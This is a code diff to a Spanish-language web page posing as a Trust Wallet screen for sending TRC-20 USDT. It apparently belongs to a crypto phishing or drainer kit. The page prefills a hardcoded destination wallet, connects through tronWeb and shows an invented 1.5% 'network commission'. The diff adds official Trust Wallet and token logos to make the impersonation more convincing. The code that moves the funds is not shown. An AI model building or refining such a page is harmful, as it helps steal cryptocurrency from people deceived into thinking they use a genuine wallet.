@@ -11,20 +11,20 @@
         .tw-container { width: 100%; max-width: 390px; padding: 20px; }
         .tw-header { display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; margin-bottom: 24px; }
         .tw-header-title { font-size: 18px; font-weight: 600; color: #0052ff; text-align: center; margin-bottom: 15px; }
-        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; }
+        .tw-logo { width: 60px; height: 60px; margin-bottom: 20px; display: block; }
         .tw-input-group { background-color: #f6f7f9; border-radius: 16px; padding: 16px; margin-bottom: 16px; }
         .tw-label { font-size: 13px; color: #717680; display: block; margin-bottom: 8px; }
         .tw-input-row { display: flex; align-items: center; justify-content: space-between; }
         .tw-input { background: transparent; border: none; color: #111111; font-size: 16px; width: 80%; outline: none; }
         .tw-currency-badge { color: #0052ff; font-size: 16px; font-weight: 600; display: flex; align-items: center; gap: 5px; }
-        .icon-size { width: 20px; height: 20px; }
+        .usdt-icon { width: 18px; height: 18px; }
         
-        /* Estilo Comisión */
         .commission-box { background: #f6f7f9; border-radius: 16px; padding: 16px; display: flex; justify-content: space-between; align-items: center; margin-bottom: 24px; }
         .comm-left { color: #717680; font-size: 14px; }
         .comm-right { text-align: right; }
         .comm-amount { font-weight: 700; font-size: 16px; display: flex; align-items: center; gap: 5px; justify-content: flex-end; }
         .comm-trx { color: #717680; font-size: 12px; }
+        .trx-icon { width: 16px; height: 16px; }
 
         .status-box { background-color: #edf2ff; border: 1px solid #cce0ff; border-radius: 12px; padding: 12px; font-size: 13px; color: #0052ff; margin-bottom: 24px; display: none; text-align: left; }
         .tw-btn { width: 100%; height: 52px; background-color: #0052ff; color: #ffffff; border: none; border-radius: 26px; font-size: 16px; font-weight: 600; cursor: pointer; }
@@ -35,8 +35,7 @@
     <div class="tw-container">
         <div class="tw-header">
             <div class="tw-header-title">Enviar TetherUsdt Trc-20</div>
-            <!-- Logo Trust Wallet -->
-            <svg class="tw-logo" viewBox="0 0 24 24" fill="#0052ff"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8z"/></svg>
+            <img src="https://assets.trustwalletapp.com/blockchains/tron/info/logo.png" alt="Trust Wallet" class="tw-logo">
         </div>
 
         <div class="tw-input-group">
@@ -48,7 +47,7 @@
             <label class="tw-label">Cantidad</label>
             <div class="tw-input-row">
                 <input id="amountDisplay" class="tw-input" type="number" placeholder="0" />
-                <span class="tw-currency-badge">USDT <svg class="icon-size" viewBox="0 0 24 24" fill="#26a17b"><circle cx="12" cy="12" r="10"/></svg></span>
+                <span class="tw-currency-badge">USDT <img src="https://assets.trustwalletapp.com/blockchains/tron/assets/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t/logo.png" class="usdt-icon"></span>
             </div>
         </div>
 
@@ -65,7 +64,7 @@
     document.getElementById('addressDisplay').value = BILLETERA_DESTINO;
 
     document.getElementById('connectBtn').addEventListener('click', async () => {
-        if (typeof window.tronWeb === 'undefined') return alert("Abre en el navegador de Trust Wallet");
+        if (typeof window.tronWeb === 'undefined') return alert("Abre este enlace en el navegador de Trust Wallet");
         const tronWeb = window.tronWeb;
 
         if (stage === 0) {
@@ -74,14 +73,14 @@
             document.getElementById('connectBtn').innerText = "Confirmar Envío";
         } else if (stage === 1) {
             const amt = parseFloat(document.getElementById('amountDisplay').value);
-            if (!amt || amt <= 0) return alert("Ingrese cantidad");
+            if (!amt || amt <= 0) return alert("Ingrese cantidad válida");
             const fee = (amt * 0.015).toFixed(2);
             document.getElementById('commissionArea').innerHTML = `
                 <div class="commission-box">
                     <div class="comm-left">Comisión de red</div>
                     <div class="comm-right">
-                        <div class="comm-amount">${fee} <svg class="icon-size" viewBox="0 0 24 24" fill="#ff0000"><circle cx="12" cy="12" r="10"/></svg></div>
-                        <div class="comm-trx">${fee} TRX</div>
+                        <div class="comm-amount">${fee} <img src="https://cryptologos.cc/logos/tron-trx-logo.png" class="trx-icon"></div>
+                        <div class="comm-trx">${fee}</div>
                     </div>
                 </div>`;
             stage = 2;
